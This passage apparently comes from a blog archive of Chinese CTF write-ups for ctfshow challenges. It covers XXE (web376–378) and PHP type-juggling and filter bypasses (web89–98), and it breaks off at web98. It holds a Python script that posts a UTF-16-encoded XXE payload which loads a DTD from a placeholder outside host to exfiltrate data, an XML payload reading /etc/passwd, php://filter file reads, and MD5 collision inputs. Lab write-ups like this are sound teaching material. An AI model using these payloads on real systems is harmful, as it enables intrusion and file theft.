class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 15:22:05</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&lt;\?xml version=&quot;1\.0&quot;/&#x27;</span>, <span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>过滤了 <code>&lt;?xml version=&quot;1.0&quot;</code> ，问题不大，还用上面的那个payload就行</p><p>看了web376，正则加了 <code>i</code> ，那上一题应该是大写绕过？</p><h1 id="web377"><a href="#web377" class="headerlink" title="web377"></a><a href="https://yq1ng.github.io/2021/09/27/ctfshow-xxe-zhuan-ti/#web377" title="web377"></a>web377</h1><p>这次增加了 <code>http</code> 的过滤，实在没有头绪，看<a href="https://blog.csdn.net/miuzzx/article/details/112347932">羽师傅的博客</a>才知道还能用编码绕过</p><p>python</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: ying</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-28 16:38:20</span></span><br><span class="line"><span class="comment"># @Last Modified by:   ying</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-28 16:39:31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://3e5309a4-b3de-4620-ada1-03c41844fb54.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE convert [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://xxx/ctfshow.dtd&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;%int;%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">payload = payload.encode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line">requests.post(url ,data=payload)</span><br></pre></td></tr></table></figure><h1 id="web378"><a href="#web378" class="headerlink" title="web378"></a><a href="https://yq1ng.github.io/2021/09/27/ctfshow-xxe-zhuan-ti/#web378" title="web378"></a>web378</h1><p>这个题很熟悉，感觉以前某个比赛出过，登陆抓包，发现传输是 xml 形式，直接读文件</p><p>xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>a<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h2 id="PHP特性"><a href="#PHP特性" class="headerlink" title="PHP特性"></a>PHP特性</h2><h3 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/php/php-intval-function.html">intval函数(获取变量的整数型)</a>：如果他的值为一个数组，只要数组里面有值，那么不论值的数量，返回值都为1，空数组则返回0</p><p><a href="https://www.runoob.com/php/php-preg_match.html">preg_match() 函数</a></p><p>利用数组绕过正则匹配，使其返回值发生错误而为false</p><p><strong>payload：?num[]=1</strong></p><h3 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="intval-num-0-："><a href="#intval-num-0-：" class="headerlink" title="intval($num,0)："></a>intval($num,0)：</h4><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><p><strong>payload：?num=010574</strong>这里我以0开始，意思就是后面的数字将被以8进制的形式读取</p><h3 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察点：正则表达式修饰符<br>拓展</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">i </span><br><span class="line">不区分(ignore)大小写</span><br><span class="line"></span><br><span class="line">m</span><br><span class="line">多(more)行匹配</span><br><span class="line">若存在换行\n并且有开始^或结束$符的情况下，</span><br><span class="line">将以换行为分隔符，逐行进行匹配</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abc\nabc&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/^abc$/m&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式。</span><br><span class="line"></span><br><span class="line">s</span><br><span class="line">特殊字符圆点 . 中包含换行符</span><br><span class="line">默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;abggab\nacbs&quot;</span>;</span><br><span class="line"><span class="variable">$preg</span> = <span class="string">&quot;/b./s&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$preg</span>, <span class="variable">$str</span>,<span class="variable">$matchs</span>);</span><br><span class="line">这样匹配到的有三个 bg b\n bs</span><br><span class="line"></span><br><span class="line">A</span><br><span class="line">强制从目标字符串开头匹配;</span><br><span class="line"></span><br><span class="line">D</span><br><span class="line">如果使用$限制结尾字符,则不允许结尾有换行; </span><br><span class="line"></span><br><span class="line">e</span><br><span class="line">配合函数<span class="title function_ invoke__">preg_replace</span>()使用, 可以把匹配来的字符串当作正则表达式执行; </span><br></pre></td></tr></table></figure><p>满足第一个匹配：?cmd=%0aphp，同时不满足第二匹配(固定字符串”php”)</p><h3 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>payload：?num=0x117c</strong></p><p>这里我采用的是16进制绕过</p><h3 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>这里直接八进制绕过?num=010574</strong></p><h3 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123; <span class="comment">// 在这个地方需要返回的值不能为0，也就是说0不能在第一位</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>所以?num=4476.0</strong></p><h3 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\./i&quot;</span>, <span class="variable">$num</span>))&#123;<span class="comment">// 点匹配没了</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用八进制开头加号代替空格绕过?num=+010574</p><h3 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]==<span class="string">&#x27;flag.php&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>paylaod:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./flag.php</span><br><span class="line">/var/www/html/flag.php</span><br><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure><h3 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><a href="https://so.csdn.net/so/search?q=md5&amp;spm=1001.2101.3001.7020">md5</a>弱类型比较可以直接数组绕过，其结果都会转换为null</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure><p>如果进行了string强制转类型后，则不再接受数组</p><p>弱碰撞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(<span class="keyword">string</span>)<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">string</span>)<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span>(  (<span class="variable">$a</span>!==<span class="variable">$b</span>) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">md5弱比较，为<span class="number">0</span>e开头的会被识别为科学记数法，结果均为<span class="number">0</span>，所以只需找两个md5后都为<span class="number">0</span>e开头且<span class="number">0</span>e后面均为数字的值即可。</span><br><span class="line">payload: a=QNKCDZO&amp;b=<span class="number">240610708</span></span><br></pre></td></tr></table></figure><p>强碰撞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=(<span class="keyword">string</span>)<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$b</span>=(<span class="keyword">string</span>)<span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span>(  (<span class="variable">$a</span>!==<span class="variable">$b</span>) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line">这时候需要找到两个真正的md5值相同数据</span><br><span class="line"></span><br><span class="line">a=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">00</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1U%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2&amp;b=M%C9h%FF%<span class="number">0</span>E%E3%<span class="number">5</span>C%<span class="number">20</span>%<span class="number">95</span>r%D4w%<span class="number">7</span>Br%<span class="number">15</span>%<span class="number">87</span>%D3o%A7%B2%<span class="number">1</span>B%DCV%B7J%<span class="number">3</span>D%C0x%<span class="number">3</span>E%<span class="number">7</span>B%<span class="number">95</span>%<span class="number">18</span>%AF%BF%A2%<span class="number">02</span>%A8%<span class="number">28</span>K%F3n%<span class="number">8</span>EKU%B3_Bu%<span class="number">93</span>%D8Igm%A0%D1%D5%<span class="number">5</span>D%<span class="number">83</span>%<span class="number">60</span>%FB_%<span class="number">07</span>%FE%A2</span><br></pre></td></tr></table></figure><h3 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span 